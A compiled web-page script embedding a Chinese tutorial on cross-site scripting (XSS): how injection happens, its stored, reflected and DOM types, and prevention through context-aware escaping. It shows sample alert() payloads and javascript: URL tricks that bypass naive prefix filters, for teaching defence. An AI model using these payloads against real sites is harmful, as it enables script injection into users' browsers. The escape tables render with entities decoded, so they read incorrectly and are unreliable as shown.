import{_ as s,c as a,f as n,o as t}from"./app-LYC0rH-0.js";const i={};function l(p,e){return t(),a("div",null,e[0]||(e[0]=[n(`<h2 id="xss攻击的介绍" tabindex="-1"><a class="header-anchor" href="#xss攻击的介绍"><span>XSS攻击的介绍</span></a></h2><h3 id="xss-漏洞的发生和修复" tabindex="-1"><a class="header-anchor" href="#xss-漏洞的发生和修复"><span>XSS 漏洞的发生和修复</span></a></h3><p>XSS 攻击是页面被注入了恶意的代码，为了更形象的介绍，我们用发生在小明同学身边的事例来进行说明。</p><h4 id="一个案例" tabindex="-1"><a class="header-anchor" href="#一个案例"><span>一个案例</span></a></h4><p>某天，公司需要一个搜索页面，根据 URL 参数决定关键词的内容。小明很快把页面写好并且上线。代码如下：</p><div class="language- line-numbers-mode" data-ext="" data-title=""><button class="copy" title="复制代码" data-copied="已复制"></button><pre class="shiki shiki-themes vitesse-light vitesse-dark vp-code"><code><span class="line"><span>复制代码&lt;input type=&quot;text&quot; value=&quot;&lt;%= getParameter(&quot;keyword&quot;) %&gt;&quot;&gt;</span></span>
<span class="line"><span>&lt;button&gt;搜索&lt;/button&gt;</span></span>
<span class="line"><span>&lt;div&gt;</span></span>
<span class="line"><span>  您搜索的关键词是：&lt;%= getParameter(&quot;keyword&quot;) %&gt;</span></span>
<span class="line"><span>&lt;/div&gt;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>然而，在上线后不久，小明就接到了安全组发来的一个神秘链接：</p><div class="language- line-numbers-mode" data-ext="" data-title=""><button class="copy" title="复制代码" data-copied="已复制"></button><pre class="shiki shiki-themes vitesse-light vitesse-dark vp-code"><code><span class="line"><span>http://xxx/search?keyword=&quot;&gt;&lt;script&gt;alert(&#39;XSS&#39;);&lt;/script&gt;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>小明带着一种不祥的预感点开了这个链接[请勿模仿，确认安全的链接才能点开]。果然，页面中弹出了写着&quot;XSS&quot;的对话框。</p><blockquote><p>可恶，中招了！小明眉头一皱，发现了其中的奥秘：</p></blockquote><p>当浏览器请求 <code>http://xxx/search?keyword=&quot;&gt;&lt;script&gt;alert(&#39;XSS&#39;);&lt;/script&gt;</code> 时，服务端会解析出请求参数 <code>keyword</code>，得到 <code>&quot;&gt;&lt;script&gt;alert(&#39;XSS&#39;);&lt;/script&gt;</code>，拼接到 HTML 中返回给浏览器。形成了如下的 HTML：</p><div class="language- line-numbers-mode" data-ext="" data-title=""><button class="copy" title="复制代码" data-copied="已复制"></button><pre class="shiki shiki-themes vitesse-light vitesse-dark vp-code"><code><span class="line"><span>复制代码&lt;input type=&quot;text&quot; value=&quot;&quot;&gt;&lt;script&gt;alert(&#39;XSS&#39;);&lt;/script&gt;&quot;&gt;</span></span>
<span class="line"><span>&lt;button&gt;搜索&lt;/button&gt;</span></span>
<span class="line"><span>&lt;div&gt;</span></span>
<span class="line"><span>  您搜索的关键词是：&quot;&gt;&lt;script&gt;alert(&#39;XSS&#39;);&lt;/script&gt;</span></span>
<span class="line"><span>&lt;/div&gt;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>浏览器无法分辨出 <code>&lt;script&gt;alert(&#39;XSS&#39;);&lt;/script&gt;</code> 是恶意代码，因而将其执行。</p><p>这里不仅仅 div 的内容被注入了，而且 input 的 value 属性也被注入， alert 会弹出两次。</p><p>面对这种情况，我们应该如何进行防范呢？</p><p>其实，这只是浏览器把用户的输入当成了脚本进行了执行。那么只要告诉浏览器这段内容是文本就可以了。</p><p>聪明的小明很快找到解决方法，把这个漏洞修复：</p><div class="language- line-numbers-mode" data-ext="" data-title=""><button class="copy" title="复制代码" data-copied="已复制"></button><pre class="shiki shiki-themes vitesse-light vitesse-dark vp-code"><code><span class="line"><span>复制代码&lt;input type=&quot;text&quot; value=&quot;&lt;%= escapeHTML(getParameter(&quot;keyword&quot;)) %&gt;&quot;&gt;</span></span>
<span class="line"><span>&lt;button&gt;搜索&lt;/button&gt;</span></span>
<span class="line"><span>&lt;div&gt;</span></span>
<span class="line"><span>  您搜索的关键词是：&lt;%= escapeHTML(getParameter(&quot;keyword&quot;)) %&gt;</span></span>
<span class="line"><span>&lt;/div&gt;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><code>escapeHTML()</code> 按照如下规则进行转义：</p><table><thead><tr><th>字符</th><th>转义后的字符</th></tr></thead><tbody><tr><td><code>&amp;</code></td><td><code>&amp;</code></td></tr><tr><td><code>&lt;</code></td><td><code>&lt;</code></td></tr><tr><td><code>&gt;</code></td><td><code>&gt;</code></td></tr><tr><td><code>&quot;</code></td><td><code>&quot;</code></td></tr><tr><td><code>&#39;</code></td><td><code>&#39;</code></td></tr><tr><td><code>/</code></td><td><code>/</code></td></tr></tbody></table><p>经过了转义函数的处理后，最终浏览器接收到的响应为：</p><div class="language- line-numbers-mode" data-ext="" data-title=""><button class="copy" title="复制代码" data-copied="已复制"></button><pre class="shiki shiki-themes vitesse-light vitesse-dark vp-code"><code><span class="line"><span>复制代码&lt;input type=&quot;text&quot; value=&quot;&amp;quot;&amp;gt;&amp;lt;script&amp;gt;alert(&amp;#x27;XSS&amp;#x27;);&amp;lt;&amp;#x2F;script&amp;gt;&quot;&gt;</span></span>
<span class="line"><span>&lt;button&gt;搜索&lt;/button&gt;</span></span>
<span class="line"><span>&lt;div&gt;</span></span>
<span class="line"><span>  您搜索的关键词是：&amp;quot;&amp;gt;&amp;lt;script&amp;gt;alert(&amp;#x27;XSS&amp;#x27;);&amp;lt;&amp;#x2F;script&amp;gt;</span></span>
<span class="line"><span>&lt;/div&gt;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>恶意代码都被转义，不再被浏览器执行，而且搜索词能够完美的在页面显示出来。</p><p>通过这个事件，小明学习到了如下知识：</p><ul><li>通常页面中包含的用户输入内容都在固定的容器或者属性内，以文本的形式展示。</li><li>攻击者利用这些页面的用户输入片段，拼接特殊格式的字符串，突破原有位置的限制，形成了代码片段。</li><li>攻击者通过在目标网站上注入脚本，使之在用户的浏览器上运行，从而引发潜在风险。</li><li>通过 HTML 转义，可以防止 XSS 攻击。[事情当然没有这么简单啦！请继续往下看]。</li></ul><h4 id="注意特殊的-html-属性、javascript-api" tabindex="-1"><a class="header-anchor" href="#注意特殊的-html-属性、javascript-api"><span>注意特殊的 HTML 属性、JavaScript API</span></a></h4><p>自从上次事件之后，小明会小心的把插入到页面中的数据进行转义。而且他还发现了大部分模板都带有的转义配置，让所有插入到页面中的数据都默认进行转义。这样就不怕不小心漏掉未转义的变量啦，于是小明的工作又渐渐变得轻松起来。</p><p>但是，作为导演的我，不可能让小明这么简单、开心地改 Bug 。</p><p>不久，小明又收到安全组的神秘链接：<code>http://xxx/?redirect_to=javascript:alert(&#39;XSS&#39;)</code>。小明不敢大意，赶忙点开页面。然而，页面并没有自动弹出万恶的“XSS”。</p><p>小明打开对应页面的源码，发现有以下内容：</p><div class="language- line-numbers-mode" data-ext="" data-title=""><button class="copy" title="复制代码" data-copied="已复制"></button><pre class="shiki shiki-themes vitesse-light vitesse-dark vp-code"><code><span class="line"><span>复制代码&lt;a href=&quot;&lt;%= escapeHTML(getParameter(&quot;redirect_to&quot;)) %&gt;&quot;&gt;跳转...&lt;/a&gt;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>这段代码，当攻击 URL 为 <code>http://xxx/?redirect_to=javascript:alert(&#39;XSS&#39;)</code>，服务端响应就成了：</p><div class="language- line-numbers-mode" data-ext="" data-title=""><button class="copy" title="复制代码" data-copied="已复制"></button><pre class="shiki shiki-themes vitesse-light vitesse-dark vp-code"><code><span class="line"><span>复制代码&lt;a href=&quot;javascript:alert(&amp;#x27;XSS&amp;#x27;)&quot;&gt;跳转...&lt;/a&gt;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>虽然代码不会立即执行，但一旦用户点击 <code>a</code> 标签时，浏览器会就会弹出“XSS”。</p><blockquote><p>可恶，又失策了...</p></blockquote><p>在这里，用户的数据并没有在位置上突破我们的限制，仍然是正确的 href 属性。但其内容并不是我们所预期的类型。</p><p>原来不仅仅是特殊字符，连 <code>javascript:</code> 这样的字符串如果出现在特定的位置也会引发 XSS 攻击。</p><p>小明眉头一皱，想到了解决办法：</p><div class="language- line-numbers-mode" data-ext="" data-title=""><button class="copy" title="复制代码" data-copied="已复制"></button><pre class="shiki shiki-themes vitesse-light vitesse-dark vp-code"><code><span class="line"><span>复制代码// 禁止 URL 以 &quot;javascript:&quot; 开头</span></span>
<span class="line"><span>xss = getParameter(&quot;redirect_to&quot;).startsWith(&#39;javascript:&#39;);</span></span>
<span class="line"><span>if (!xss) {</span></span>
<span class="line"><span>  &lt;a href=&quot;&lt;%= escapeHTML(getParameter(&quot;redirect_to&quot;))%&gt;&quot;&gt;</span></span>
<span class="line"><span>    跳转...</span></span>
<span class="line"><span>  &lt;/a&gt;</span></span>
<span class="line"><span>} else {</span></span>
<span class="line"><span>  &lt;a href=&quot;/404&quot;&gt;</span></span>
<span class="line"><span>    跳转...</span></span>
<span class="line"><span>  &lt;/a&gt;</span></span>
<span class="line"><span>}</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>只要 URL 的开头不是 <code>javascript:</code>，就安全了吧？</p><p>安全组随手又扔了一个连接：<code>http://xxx/?redirect_to=jAvascRipt:alert(&#39;XSS&#39;)</code></p><blockquote><p>这也能执行？.....好吧，浏览器就是这么强大。</p></blockquote><p>小明欲哭无泪，在判断 URL 开头是否为 <code>javascript:</code> 时，先把用户输入转成了小写，然后再进行比对。</p><p>不过，所谓“道高一尺，魔高一丈”。面对小明的防护策略，安全组就构造了这样一个连接：</p><div class="language- line-numbers-mode" data-ext="" data-title=""><button class="copy" title="复制代码" data-copied="已复制"></button><pre class="shiki shiki-themes vitesse-light vitesse-dark vp-code"><code><span class="line"><span>http://xxx/?redirect_to=%20javascript:alert(&#39;XSS&#39;)</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p><code>%20javascript:alert(&#39;XSS&#39;)</code> 经过 URL 解析后变成 <code>javascript:alert(&#39;XSS&#39;)</code>，这个字符串以空格开头。这样攻击者可以绕过后端的关键词规则，又成功的完成了注入。</p><p>最终，小明选择了白名单的方法，彻底解决了这个漏洞：</p><div class="language- line-numbers-mode" data-ext="" data-title=""><button class="copy" title="复制代码" data-copied="已复制"></button><pre class="shiki shiki-themes vitesse-light vitesse-dark vp-code"><code><span class="line"><span>复制代码// 根据项目情况进行过滤，禁止掉 &quot;javascript:&quot; 链接、非法 scheme 等</span></span>
<span class="line"><span>allowSchemes = [&quot;http&quot;, &quot;https&quot;];</span></span>
<span class="line"><span></span></span>
<span class="line"><span>valid = isValid(getParameter(&quot;redirect_to&quot;), allowSchemes);</span></span>
<span class="line"><span></span></span>
<span class="line"><span>if (valid) {</span></span>
<span class="line"><span>  &lt;a href=&quot;&lt;%= escapeHTML(getParameter(&quot;redirect_to&quot;))%&gt;&quot;&gt;</span></span>
<span class="line"><span>    跳转...</span></span>
<span class="line"><span>  &lt;/a&gt;</span></span>
<span class="line"><span>} else {</span></span>
<span class="line"><span>  &lt;a href=&quot;/404&quot;&gt;</span></span>
<span class="line"><span>    跳转...</span></span>
<span class="line"><span>  &lt;/a&gt;</span></span>
<span class="line"><span>}</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>通过这个事件，小明学习到了如下知识：</p><ul><li>做了 HTML 转义，并不等于高枕无忧。</li><li>对于链接跳转，如 <code>&lt;a href=&quot;xxx&quot;</code> 或 <code>location.href=&quot;xxx&quot;</code>，要检验其内容，禁止以 <code>javascript:</code> 开头的链接，和其他非法的 scheme。</li></ul><h4 id="根据上下文采用不同的转义规则" tabindex="-1"><a class="header-anchor" href="#根据上下文采用不同的转义规则"><span>根据上下文采用不同的转义规则</span></a></h4><p>某天，小明为了加快网页的加载速度，把一个数据通过 JSON 的方式内联到 HTML 中：</p><div class="language- line-numbers-mode" data-ext="" data-title=""><button class="copy" title="复制代码" data-copied="已复制"></button><pre class="shiki shiki-themes vitesse-light vitesse-dark vp-code"><code><span class="line"><span>复制代码&lt;script&gt;</span></span>
<span class="line"><span>var initData = &lt;%= data.toJSON() %&gt;</span></span>
<span class="line"><span>&lt;/script&gt;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>插入 JSON 的地方不能使用 <code>escapeHTML()</code>，因为转义 <code>&quot;</code> 后，JSON 格式会被破坏。</p><p>但安全组又发现有漏洞，原来这样内联 JSON 也是不安全的：</p><ul><li>当 JSON 中包含 <code>U+2028</code> 或 <code>U+2029</code> 这两个字符时，不能作为 JavaScript 的字面量使用，否则会抛出语法错误。</li><li>当 JSON 中包含字符串 <code>&lt;/script&gt;</code> 时，当前的 script 标签将会被闭合，后面的字符串内容浏览器会按照 HTML 进行解析；通过增加下一个 <code>&lt;script&gt;</code> 标签等方法就可以完成注入。</li></ul><p>于是我们又要实现一个 <code>escapeEmbedJSON()</code> 函数，对内联 JSON 进行转义。</p><p>转义规则如下：</p><table><thead><tr><th>字符</th><th>转义后的字符</th></tr></thead><tbody><tr><td><code>U+2028</code></td><td><code>\\u2028</code></td></tr><tr><td><code>U+2029</code></td><td><code>\\u2029</code></td></tr><tr><td><code>&lt;</code></td><td><code>\\u003c</code></td></tr></tbody></table><p>修复后的代码如下：</p><div class="language- line-numbers-mode" data-ext="" data-title=""><button class="copy" title="复制代码" data-copied="已复制"></button><pre class="shiki shiki-themes vitesse-light vitesse-dark vp-code"><code><span class="line"><span>复制代码&lt;script&gt;</span></span>
<span class="line"><span>var initData = &lt;%= escapeEmbedJSON(data.toJSON()) %&gt;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div></div></div><p>通过这个事件，小明学习到了如下知识：</p><ul><li>HTML 转义是非常复杂的，在不同的情况下要采用不同的转义规则。如果采用了错误的转义规则，很有可能会埋下 XSS 隐患。</li><li>应当尽量避免自己写转义库，而应当采用成熟的、业界通用的转义库。</li></ul><h3 id="漏洞总结" tabindex="-1"><a class="header-anchor" href="#漏洞总结"><span>漏洞总结</span></a></h3><p>小明的例子讲完了，下面我们来系统的看下 XSS 有哪些注入的方法：</p><ul><li>在 HTML 中内嵌的文本中，恶意内容以 script 标签形成注入。</li><li>在内联的 JavaScript 中，拼接的数据突破了原本的限制（字符串，变量，方法名等）。</li><li>在标签属性中，恶意内容包含引号，从而突破属性值的限制，注入其他属性或者标签。</li><li>在标签的 href、src 等属性中，包含 <code>javascript:</code> 等可执行代码。</li><li>在 onload、onerror、onclick 等事件中，注入不受控制代码。</li><li>在 style 属性和标签中，包含类似 <code>background-image:url(&quot;javascript:...&quot;);</code> 的代码（新版本浏览器已经可以防范）。</li><li>在 style 属性和标签中，包含类似 <code>expression(...)</code> 的 CSS 表达式代码（新版本浏览器已经可以防范）。</li></ul><p>总之，如果开发者没有将用户输入的文本进行合适的过滤，就贸然插入到 HTML 中，这很容易造成注入漏洞。攻击者可以利用漏洞，构造出恶意的代码指令，进而利用恶意代码危害数据安全。</p><h2 id="xss攻击的分类" tabindex="-1"><a class="header-anchor" href="#xss攻击的分类"><span>XSS攻击的分类</span></a></h2><h3 id="什么是xss" tabindex="-1"><a class="header-anchor" href="#什么是xss"><span>什么是XSS</span></a></h3><p>Cross-Site Scripting（跨站脚本攻击）简称 XSS，是一种代码注入攻击。攻击者通过在目标网站上注入恶意脚本，使之在用户的浏览器上运行。利用这些恶意脚本，攻击者可获取用户的敏感信息如 Cookie、SessionID 等，进而危害数据安全。</p><p>为了和 CSS 区分，这里把攻击的第一个字母改成了 X，于是叫做 XSS。</p><p>XSS 的本质是：恶意代码未经过滤，与网站正常的代码混在一起；浏览器无法分辨哪些脚本是可信的，导致恶意脚本被执行。</p><p>而由于直接在用户的终端执行，恶意代码能够直接获取用户的信息，或者利用这些信息冒充用户向网站发起攻击者定义的请求。</p><p>在部分情况下，由于输入的限制，注入的恶意脚本比较短。但可以通过引入外部的脚本，并由浏览器执行，来完成比较复杂的攻击策略。</p><p>这里有一个问题：用户是通过哪种方法“注入”恶意脚本的呢？</p><p>不仅仅是业务上的“用户的 UGC 内容”可以进行注入，包括 URL 上的参数等都可以是攻击的来源。在处理输入时，以下内容都不可信：</p><ul><li>来自用户的 UGC 信息</li><li>来自第三方的链接</li><li>URL 参数</li><li>POST 参数</li><li>Referer （可能来自不可信的来源）</li><li>Cookie （可能来自其他子域注入）</li></ul><h3 id="xss-分类" tabindex="-1"><a class="header-anchor" href="#xss-分类"><span>XSS 分类</span></a></h3><p>根据攻击的来源，XSS 攻击可分为存储型、反射型和 DOM 型三种。</p><ul><li>存储区：恶意代码存放的位置。</li><li>插入点：由谁取得恶意代码，并插入到网页上。</li></ul><h4 id="存储型-xss" tabindex="-1"><a class="header-anchor" href="#存储型-xss"><span>存储型 XSS</span></a></h4><p>存储型 XSS 的攻击步骤：</p><ol><li>攻击者将恶意代码提交到目标网站的数据库中。</li><li>用户打开目标网站时，网站服务端将恶意代码从数据库取出，拼接在 HTML 中返回给浏览器。</li><li>用户浏览器接收到响应后解析执行，混在其中的恶意代码也被执行。</li><li>恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作。</li></ol><p>这种攻击常见于带有用户保存数据的网站功能，如论坛发帖、商品评论、用户私信等。</p><h4 id="反射型-xss" tabindex="-1"><a class="header-anchor" href="#反射型-xss"><span>反射型 XSS</span></a></h4><p>反射型 XSS 的攻击步骤：</p><ol><li>攻击者构造出特殊的 URL，其中包含恶意代码。</li><li>用户打开带有恶意代码的 URL 时，网站服务端将恶意代码从 URL 中取出，拼接在 HTML 中返回给浏览器。</li><li>用户浏览器接收到响应后解析执行，混在其中的恶意代码也被执行。</li><li>恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作。</li></ol><p>反射型 XSS 跟存储型 XSS 的区别是：存储型 XSS 的恶意代码存在数据库里，反射型 XSS 的恶意代码存在 URL 里。</p><p>反射型 XSS 漏洞常见于通过 URL 传递参数的功能，如网站搜索、跳转等。</p><p>由于需要用户主动打开恶意的 URL 才能生效，攻击者往往会结合多种手段诱导用户点击。</p><p>POST 的内容也可以触发反射型 XSS，只不过其触发条件比较苛刻（需要构造表单提交页面，并引导用户点击），所以非常少见。</p><h4 id="dom-型-xss" tabindex="-1"><a class="header-anchor" href="#dom-型-xss"><span>DOM 型 XSS</span></a></h4><p>DOM 型 XSS 的攻击步骤：</p><ol><li>攻击者构造出特殊的 URL，其中包含恶意代码。</li><li>用户打开带有恶意代码的 URL。</li><li>用户浏览器接收到响应后解析执行，前端 JavaScript 取出 URL 中的恶意代码并执行。</li><li>恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作。</li></ol><p>DOM 型 XSS 跟前两种 XSS 的区别：DOM 型 XSS 攻击中，取出和执行恶意代码由浏览器端完成，属于前端 JavaScript 自身的安全漏洞，而其他两种 XSS 都属于服务端的安全漏洞。</p><h2 id="xss-攻击的预防" tabindex="-1"><a class="header-anchor" href="#xss-攻击的预防"><span>XSS 攻击的预防</span></a></h2><p>通过前面的介绍可以得知，XSS 攻击有两大要素：</p><ol><li>攻击者提交恶意代码。</li><li>浏览器执行恶意代码。</li></ol><p>针对第一个要素：我们是否能够在用户输入的过程，过滤掉用户输入的恶意代码呢？</p><h3 id="输入过滤" tabindex="-1"><a class="header-anchor" href="#输入过滤"><span>输入过滤</span></a></h3><p>在用户提交时，由前端过滤输入，然后提交到后端。这样做是否可行呢？</p><p>答案是不可行。一旦攻击者绕过前端过滤，直接构造请求，就可以提交恶意代码了。</p><p>那么，换一个过滤时机：后端在写入数据库前，对输入进行过滤，然后把“安全的”内容，返回给前端。这样是否可行呢？</p><p>我们举一个例子，一个正常的用户输入了 <code>5 &lt; 7</code> 这个内容，在写入数据库前，被转义，变成了 <code>5 &lt; 7</code>。</p><p>问题是：在提交阶段，我们并不确定内容要输出到哪里。</p><p>这里的“并不确定内容要输出到哪里”有两层含义：</p><ol><li>用户的输入内容可能同时提供给前端和客户端，而一旦经过了 <code>escapeHTML()</code>，客户端显示的内容就变成了乱码( <code>5 &lt; 7</code> )。</li><li>在前端中，不同的位置所需的编码也不同。</li></ol><ul><li><p>当 <code>5 &lt; 7</code> 作为 HTML 拼接页面时，可以正常显示：</p><div class="language- line-numbers-mode" data-ext="" data-title=""><button class="copy" title="复制代码" data-copied="已复制"></button><pre class="shiki shiki-themes vitesse-light vitesse-dark vp-code"><code><span class="line"><span>复制代码&lt;div title=&quot;comment&quot;&gt;5 &amp;lt; 7&lt;/div&gt;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div></li><li><p>当 <code>5 &lt; 7</code> 通过 Ajax 返回，然后赋值给 JavaScript 的变量时，前端得到的字符串就是转义后的字符。这个内容不能直接用于 Vue 等模板的展示，也不能直接用于内容长度计算。不能用于标题、alert 等。</p></li></ul><p>所以，输入侧过滤能够在某些情况下解决特定的 XSS 问题，但会引入很大的不确定性和乱码问题。在防范 XSS 攻击时应避免此类方法。</p><p>当然，对于明确的输入类型，例如数字、URL、电话号码、邮件地址等等内容，进行输入过滤还是必要的。</p><p>既然输入过滤并非完全可靠，我们就要通过“防止浏览器执行恶意代码”来防范 XSS。这部分分为两类：</p><ul><li>防止 HTML 中出现注入。</li><li>防止 JavaScript 执行时，执行恶意代码。</li></ul><h3 id="预防存储型和反射型-xss-攻击" tabindex="-1"><a class="header-anchor" href="#预防存储型和反射型-xss-攻击"><span>预防存储型和反射型 XSS 攻击</span></a></h3><p>存储型和反射型 XSS 都是在服务端取出恶意代码后，插入到响应 HTML 里的，攻击者刻意编写的“数据”被内嵌到“代码”中，被浏览器所执行。</p><p>预防这两种漏洞，有两种常见做法：</p><ul><li>改成纯前端渲染，把代码和数据分隔开。</li><li>对 HTML 做充分转义。</li></ul><h4 id="纯前端渲染" tabindex="-1"><a class="header-anchor" href="#纯前端渲染"><span>纯前端渲染</span></a></h4><p>纯前端渲染的过程：</p><ol><li>浏览器先加载一个静态 HTML，此 HTML 中不包含任何跟业务相关的数据。</li><li>然后浏览器执行 HTML 中的 JavaScript。</li><li>JavaScript 通过 Ajax 加载业务数据，调用 DOM API 更新到页面上。</li></ol><p>在纯前端渲染中，我们会明确的告诉浏览器：下面要设置的内容是文本（<code>.innerText</code>），还是属性（<code>.setAttribute</code>），还是样式（<code>.style</code>）等等。浏览器不会被轻易的被欺骗，执行预期外的代码了。</p><p>但纯前端渲染还需注意避免 DOM 型 XSS 漏洞（例如 <code>onload</code> 事件和 <code>href</code> 中的 <code>javascript:xxx</code> 等，参考下文”预防 DOM 型 XSS 攻击“部分）。</p><p>在很多内部、管理系统中，采用纯前端渲染是非常合适的。但对于性能要求高，或有 SEO 需求的页面，我们仍然要面对拼接 HTML 的问题。</p><h4 id="转义-html" tabindex="-1"><a class="header-anchor" href="#转义-html"><span>转义 HTML</span></a></h4><p>如果拼接 HTML 是必要的，就需要采用合适的转义库，对 HTML 模板各处插入点进行充分的转义。</p><p>常用的模板引擎，如 doT.js、ejs、FreeMarker 等，对于 HTML 转义通常只有一个规则，就是把 <code>&amp; &lt; &gt; &quot; &#39; /</code> 这几个字符转义掉，确实能起到一定的 XSS 防护作用，但并不完善：</p><table><thead><tr><th>XSS 安全漏洞</th><th>简单转义是否有防护作用</th></tr></thead><tbody><tr><td>HTML 标签文字内容</td><td>有</td></tr><tr><td>HTML 属性值</td><td>有</td></tr><tr><td>CSS 内联样式</td><td>无</td></tr><tr><td>内联 JavaScript</td><td>无</td></tr><tr><td>内联 JSON</td><td>无</td></tr><tr><td>跳转链接</td><td>无</td></tr></tbody></table><p>所以要完善 XSS 防护措施，我们要使用更完善更细致的转义策略。</p><p>例如 Java 工程里，常用的转义库为 <code>org.owasp.encoder</code>。以下代码引用自 <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.owasp.org%2Findex.php%2FOWASP_Java_Encoder_Project%23tab%3DUse_the_Java_Encoder_Project" target="_blank" rel="noopener noreferrer">org.owasp.encoder 的官方说明</a>。</p><div class="language- line-numbers-mode" data-ext="" data-title=""><button class="copy" title="复制代码" data-copied="已复制"></button><pre class="shiki shiki-themes vitesse-light vitesse-dark vp-code"><code><span class="line"><span>复制代码&lt;!-- HTML 标签内文字内容 --&gt;</span></span>
<span class="line"><span>&lt;div&gt;&lt;%= Encode.forHtml(UNTRUSTED) %&gt;&lt;/div&gt;</span></span>
<span class="line"><span></span></span>
<span class="line"><span>&lt;!-- HTML 标签属性值 --&gt;</span></span>
<span class="line"><span>&lt;input value=&quot;&lt;%= Encode.forHtml(UNTRUSTED) %&gt;&quot; /&gt;</span></span>
<span class="line"><span></span></span>
<span class="line"><span>&lt;!-- CSS 属性值 --&gt;</span></span>
<span class="line"><span>&lt;div style=&quot;width:&lt;= Encode.forCssString(UNTRUSTED) %&gt;&quot;&gt;</span></span>
<span class="line"><span></span></span>
<span class="line"><span>&lt;!-- CSS URL --&gt;</span></span>
<span class="line"><span>&lt;div style=&quot;background:&lt;= Encode.forCssUrl(UNTRUSTED) %&gt;&quot;&gt;</span></span>
<span class="line"><span></span></span>
<span class="line"><span>&lt;!-- JavaScript 内联代码块 --&gt;</span></span>
<span class="line"><span>&lt;script&gt;</span></span>
<span class="line"><span>  var msg = &quot;&lt;%= Encode.forJavaScript(UNTRUSTED) %&gt;&quot;;</span></span>
<span class="line"><span>  alert(msg);</span></span>
<span class="line"><span>&lt;/script&gt;</span></span>
<span class="line"><span></span></span>
<span class="line"><span>&lt;!-- JavaScript 内联代码块内嵌 JSON --&gt;</span></span>
<span class="line"><span>&lt;script&gt;</span></span>
<span class="line"><span>var __INITIAL_STATE__ = JSON.parse(&#39;&lt;%= Encoder.forJavaScript(data.to_json) %&gt;&#39;);</span></span>
<span class="line"><span>&lt;/script&gt;</span></span>
<span class="line"><span></span></span>
<span class="line"><span>&lt;!-- HTML 标签内联监听器 --&gt;</span></span>
<span class="line"><span>&lt;button</span></span>
<span class="line"><span>  onclick=&quot;alert(&#39;&lt;%= Encode.forJavaScript(UNTRUSTED) %&gt;&#39;);&quot;&gt;</span></span>
<span class="line"><span>  click me</span></span>
<span class="line"><span>&lt;/button&gt;</span></span>
<span class="line"><span></span></span>
<span class="line"><span>&lt;!-- URL 参数 --&gt;</span></span>
<span class="line"><span>&lt;a href=&quot;/search?value=&lt;%= Encode.forUriComponent(UNTRUSTED) %&gt;&amp;order=1#top&quot;&gt;</span></span>
<span class="line"><span></span></span>
<span class="line"><span>&lt;!-- URL 路径 --&gt;</span></span>
<span class="line"><span>&lt;a href=&quot;/page/&lt;%= Encode.forUriComponent(UNTRUSTED) %&gt;&quot;&gt;</span></span>
<span class="line"><span></span></span>
<span class="line"><span>&lt;!--</span></span>
<span class="line"><span>  URL.</span></span>
<span class="line"><span>  注意：要根据项目情况进行过滤，禁止掉 &quot;javascript:&quot; 链接、非法 scheme 等</span></span>
<span class="line"><span>--&gt;</span></span>
<span class="line"><span>&lt;a href=&#39;&lt;%=</span></span>
<span class="line"><span>  urlValidator.isValid(UNTRUSTED) ?</span></span>
<span class="line"><span>    Encode.forHtml(UNTRUSTED) :</span></span>
<span class="line"><span>    &quot;/404&quot;</span></span>
<span class="line"><span>%&gt;&#39;&gt;</span></span>
<span class="line"><span>  link</span></span>
<span class="line"><span>&lt;/a&gt;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div 